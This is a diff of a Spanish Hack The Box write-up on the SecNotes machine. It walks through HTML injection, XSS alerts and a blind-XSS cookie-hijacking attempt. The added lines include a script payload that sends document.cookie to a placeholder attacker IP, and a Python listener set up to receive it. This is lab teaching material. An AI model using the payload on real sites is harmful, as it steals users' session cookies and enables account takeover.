@@ -151,6 +151,8 @@ Por otra parte, vemos que la página nos permite crear una serie de notas, hagá
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/10.png)
 
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/11.png)
+
 Vemos que el mecanismo de la página es bastante simple, pero si durante el desarrollo de la misma, no se tuvo en consideración ningún tipo de seguridad, quizá esta sea vulnerable a algo tan básico como confiar plenamente en el input del usuario.
 
 Intentemos ya algo no intencionado como una [inyección HTML](https://mateonitro550.github.io/HTML-Injection).
@@ -161,15 +163,17 @@ En el campo _Title_ podemos escribir cualquier cosa, aunque perfectamente podrí
 <h1>Una frase cualquiera</h1>
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/11.png)
+De este modo el texto que introduzcamos cambiará su formato al de _header 1_.
 
-O por ejemplo:
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/12.png)
+
+O por ejemplo, podemos hacer que nuestro texto se desplace:
 
 ```html
 <marquee>Una frase cualquiera</marquee>
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/12.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/13.png)
 
 Vemos que como atacantes, tenemos la capacidad de inyectar código al propio código fuente de la página web. ¿Qué tal si probamos ahora un [XSS](https://mateonitro550.github.io/https://mateonitro550.github.io/Cross-Site-Scripting-(XSS)) (Cross-Site Scripting)?
 
@@ -179,39 +183,59 @@ Igual que antes, en el campo _Title_ podemos escribir cualquier cosa, y en el ca
 <script>alert("Una frase cualquiera")</script>
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/13.png)
+Podemos observar que cada vez que la página web se recarga, aparece un mensaje con el texto que indicamos anteriormente.
 
-En vez de mostrar por pantalla una frase cualquiera, ¿por qué mejor no vemos la cookie de la sesión actual?
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/14.png)
+
+¿Qué tal si en vez de mostrar por pantalla una frase cualquiera, listamos mejor información relevante como la cookie de sesión?
 
 ```html
 <script>alert(document.cookie)</script>
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/14.png)
-
-POR AQUÍ DIGO DE PROBAR UN BLIND XSS
-
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/15.png)
 
-Una vez comprobamos que podemos visualizar la cookie de nuestra sesión, ¿por qué no intentamos secuestar la cookie de sesión de otro usuario? De esa manera, si tiene su sesión abierta, podríamos 'logearnos' sin proporcionar credenciales, únicamente su cookie de sesión.
+Una vez comprobamos que tenemos la capacidad de visualizar nuestra propia cookie de sesión a través de ventanas emergentes (pop-ups), tenemos que pensar en una forma de obtener la cookie directamente en nuestro equipo de atacantes, ya que de momento, estas ventanas solo son visibles por los usuarios cuando están en su panel de inicio, además de que llaman bastante la atención.
 
-Si recordamos, el mensaje inicial que aparecía en la página, mencionaba que nos pongamos en contacto con `tyler` a través del botón _Contact Us_; así que lo primero que haremos sera  comprobar si este lee nuestros mensajes, para ello le enviaremos un url que apunte a nuestra máquina.
+Para ello, haremos uso de un [Blind XSS](https://mateonitro550.github.io/https://mateonitro550.github.io/Cross-Site-Scripting-(XSS)) para efectuar un `Cookie Hijacking`, de modo que secuestrando la cookie de sesión de otro usuario, si tiene este su sesión abierta, podríamos 'logearnos' sin proporcionar credenciales, únicamente el valor de su cookie.
 
-Es importante mencionar que un usuario real, a no ser a que tenga nulos conocimientos de seguridad informática, abriría un enlace que le envía un total desconocido, pero en este caso, al ser un usuario simulado, no gestiona muy bien el ocultar nuestro url malicioso, por lo que no podemos ocultarlo con _href_, _acortadores_, _iframe_ o algún otro método.
-
-Bien, lo primero que haremos será hostear un servidor con `Python`.
+Empezaremos por crear un servidor con `Python`, en el cual recibiremos las cookies de los usuarios cada que estos refresquen, o se encuentren en su panel de inicio.
 
 ```bash
 sudo python3 -m http.server 80
 ```
 
+A continuación, crearemos una nota con el siguiente mensaje:
+
+```html
+<script>document.write('<img src="http://nuestraDirecciónIP:80/cookie=' + document.cookie + '">')</script>
+```
+
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/16.png)
 
-ESTA FOTO ES DEL BLIND XSS CON TLYER
+En vista de que recibimos nuestra propia cookie de sesión directamente en nuestro equipo, sería solo cuestión de tiempo para hacernos con las cookies de otros usuarios, si los existiera, claro está.
+
+Por obvias razones no existen más clientes que interactuen con el servidor web, a excepción de uno. Si recordamos, el mensaje inicial que aparecía en la página, mencionaba que nos pongamos en contacto con `tyler` a través del botón _Contact Us_; así que lo primero que haremos sera  comprobar si este lee nuestros mensajes, para ello le enviaremos un url que apunte a nuestra máquina.
+
+Es importante mencionar que no podemos ocultar nuestro url con _href_, _acortadores_, _iframe_ o algún otro método, ya que al ser un usuario simulado, este no lo gestiona muy bien. Por su parte, un usuario real, a no ser a que tenga nulos conocimientos de seguridad informática, abriría un enlace que le envía un total desconocido.
+
+Sin cerrar nuestro servidor hosteado con `Python`, a través del botón _Contact Us_, enviaremos el siguiente mensaje para confirmar si `tyler` lee nuestros mensajes:
+
+```html
+http://nuestraDirecciónIP:80/tylerEstáPresente
+```
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/17.png)
 
+Vemos que conseguimos una petición por GET por parte de la máquina víctima, por lo que asumimos que este lee nuestros mensajes. Ya con esto podemos pensar que tenemos una posible vía potencial para hacernos con la cookie del usuario. Por lo cual, enviaremos el siguiente mensaje:
+
+```html
+<script>document.write('<img src="http://nuestraDirecciónIP:80/cookie=' + document.cookie + '">')</script>
+```
+
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/18.png)
+
+Para nuestra sorpresa, esto no funciona, así que tenemos que buscar otra alternativa.
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/19.png)
 
